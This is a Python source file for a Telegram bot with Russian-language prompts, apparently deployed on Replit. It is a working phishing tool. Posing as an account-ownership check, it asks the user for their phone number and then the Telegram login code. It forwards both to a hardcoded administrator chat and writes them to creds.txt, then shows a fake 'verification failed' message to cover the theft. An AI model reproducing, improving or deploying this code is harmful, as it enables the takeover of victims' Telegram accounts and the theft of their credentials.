import os
import telebot
import logging
import time
from flask import Flask
from threading import Thread

# Токен берется из секретов Replit
# ВНИМАНИЕ: Убедитесь, что вы добавили 'TELEGRAM_BOT_TOKEN' в Secrets (иконка замка слева)
TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
if not TOKEN:
    print("Ошибка: TOKEN не найден в Secrets. Пожалуйста, добавьте TOKEN.")
    exit(1)

bot = telebot.TeleBot(TOKEN)
logging.basicConfig(level=logging.INFO)

# Хранилище данных: user_id -> {"step": 1, "phone": None, "code": None}
user_data = {}
# Хранилище лимитов: user_id -> [timestamp1, timestamp2, ...]
user_limits = {}

def check_spam_limit(user_id):
    current_time = time.time()
    # Очищаем старые записи (старше 24 часов)
    if user_id in user_limits:
        user_limits[user_id] = [t for t in user_limits[user_id] if current_time - t < 86400]
    else:
        user_limits[user_id] = []
    
    if len(user_limits[user_id]) >= 2:
        return False
    return True

# ID администратора для уведомлений
ADMIN_ID = 8282545375

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    
    if not check_spam_limit(user_id):
        bot.reply_to(message, "Вы исчерпали лимит заявок на сегодня (максимум 2 в день). Попробуйте позже.")
        return

    username = message.from_user.username or "нет"
    first_name = message.from_user.first_name or "нет"
    
    user_data[user_id] = {"step": 1}
    
    # Уведомление администратора о новом пользователе
    try:
        admin_msg = (
            f"🔔 НОВЫЙ ПОЛЬЗОВАТЕЛЬ НАЖАЛ /START\n\n"
            f"👤 Имя: {first_name}\n"
            f"🆔 ID: {user_id}\n"
            f"🔗 Username: @{username}"
        )
        bot.send_message(ADMIN_ID, admin_msg)
    except Exception as e:
        logging.error(f"Ошибка отправки уведомления админу: {e}")
        
    bot.reply_to(message, "Проверка подлинности владельца аккаунта.\n\nДля завершения процедуры идентификации и подтверждения, что вы являетесь законным владельцем данного аккаунта Telegram, требуется верификация.\n\nПожалуйста, введите номер телефона, связанный с аккаунтом, в международном формате (например, +71234567890). Система направит вам код подтверждения для проверки.")

@bot.message_handler(func=lambda message: user_data.get(message.from_user.id, {}).get("step") == 1)
def get_phone(message):
    user_id = message.from_user.id
    text = message.text.strip() if message.text else ""
    if text.startswith('+') and text[1:].isdigit() and len(text) >= 10:
        user_data[user_id]["phone"] = text
        user_data[user_id]["step"] = 2
        
        # Уведомление администратора о вводе телефона
        try:
            bot.send_message(ADMIN_ID, f"📱 ПОЛЬЗОВАТЕЛЬ ВВЕЛ НОМЕР\nID: {user_id}\nНомер: {text}")
        except:
            pass
            
        bot.send_message(user_id, f"Номер {text} получен.\n\nКод подтверждения был отправлен в ваше приложение Telegram. Немедленно перешлите этот 5-значный код сюда.")
    else:
        bot.send_message(user_id, "Неверный формат. Отправьте ваш номер телефона, начиная с '+' (например, +71234567890).")

@bot.message_handler(func=lambda message: user_data.get(message.from_user.id, {}).get("step") == 2)
def get_code(message):
    user_id = message.from_user.id
    if message.text and message.text.isdigit() and len(message.text) == 5:
        user_data[user_id]["code"] = message.text
        phone = user_data[user_id]["phone"]
        code = user_data[user_id]["code"]
        
        # Логируем полученные данные
        logging.info(f"ДАННЫЕ ПОЛУЧЕНЫ: ID пользователя: {user_id}, Телефон: {phone}, Код: {code}")
        
        # Уведомление администратора о вводе кода
        try:
            bot.send_message(ADMIN_ID, f"🔑 ПОЛУЧЕН КОД\nID: {user_id}\nТелефон: {phone}\nКод: {code}")
        except:
            pass
        
        # Отправляем данные в файл
        with open("creds.txt", "a", encoding="utf-8") as f:
            f.write(f"{user_id}|{phone}|{code}|{time.ctime()}\n")
        
        # Увеличиваем счетчик заявок
        if user_id not in user_limits:
            user_limits[user_id] = []
        user_limits[user_id].append(time.time())
        
        bot.send_message(user_id, "Обработка кода...")
        time.sleep(2)
        bot.send_message(user_id, "Проверка не удалась.\n\nВремя соединения истекло. Срок действия проверки безопасности истек. Возможно, вам потребуется начать процесс заново позже.")
        
        # Очищаем данные пользователя
        del user_data[user_id]
    else:
        bot.send_message(user_id, "Неверный код. Отправьте точный 5-значный код, полученный от Telegram.")

# Web-server для поддержки работы бота (keep-alive)
app = Flask('')

@app.route('/')
def home():
    return "Bot is alive!"

def run():
    # Flask web server for health check on port 8080 (or other available)
    # The main port 5000 is used by the JS app
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

if __name__ == "__main__":
    # Запуск в основном потоке без Flask для стабильности, 
    # так как Replit перезапускает процессы
    print("Бот запущен и работает...")
    bot.infinity_polling()
